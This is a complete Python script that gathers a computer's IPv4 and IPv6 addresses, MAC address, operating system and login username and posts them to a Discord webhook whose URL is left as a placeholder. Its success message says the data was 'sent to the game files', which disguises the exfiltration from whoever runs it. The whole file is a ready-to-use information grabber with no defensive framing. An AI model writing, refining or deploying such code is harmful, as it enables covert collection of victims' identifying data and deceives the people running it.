import socket
import uuid
import platform
import os
import requests
import json

# Get IPv4 Address
def get_ipv4():
    try:
        hostname = socket.gethostname()
        ipv4 = socket.gethostbyname(hostname)
        return ipv4
    except Exception as e:
        return f"Could not get IPv4: {e}"

# Get IPv6 Address
def get_ipv6():
    try:
        ipv6 = socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6)
        return ipv6[0][4][0]
    except Exception as e:
        return f"Could not get IPv6: {e}"

# Get MAC Address
def get_mac_address():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1])
        return mac
    except Exception as e:
        return f"Could not get MAC address: {e}"

# Get Operating System Information
def get_os_info():
    try:
        os_info = platform.system() + " " + platform.release()
        return os_info
    except Exception as e:
        return f"Could not get OS info: {e}"

# Get Username
def get_username():
    try:
        username = os.getlogin()
        return username
    except Exception as e:
        return f"Could not get username: {e}"

# Send Data to Discord Webhook
def send_to_webhook(webhook_url, data):
    try:
        headers = {'Content-Type': 'application/json'}
        payload = {
            "content": None,
            "embeds": [
                {
                    "title": "System Information",
                    "fields": [
                        {"name": "IPv4 Address", "value": data['ipv4'], "inline": False},
                        {"name": "IPv6 Address", "value": data['ipv6'], "inline": False},
                        {"name": "MAC Address", "value": data['mac'], "inline": False},
                        {"name": "Operating System", "value": data['os'], "inline": False},
                        {"name": "Username", "value": data['username'], "inline": False},
                    ],
                    "color": 5814783
                }
            ]
        }
        response = requests.post(webhook_url, headers=headers, data=json.dumps(payload))
        if response.status_code == 204:
            print("Data successfully sent to the game files.")
        else:
            print(f"Failed to send data. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending data to webhook: {e}")

# Main function
if __name__ == "__main__":
        webhook_url = "YOUR_DISCORD_WEBHOOK"

        # Collect system information
        data = {
            'ipv4': get_ipv4(),
            'ipv6': get_ipv6(),
            'mac': get_mac_address(),
            'os': get_os_info(),
            'username': get_username(),
        }

        # Send the data to Discord webhook
        send_to_webhook(webhook_url, data)
        print("Done..")
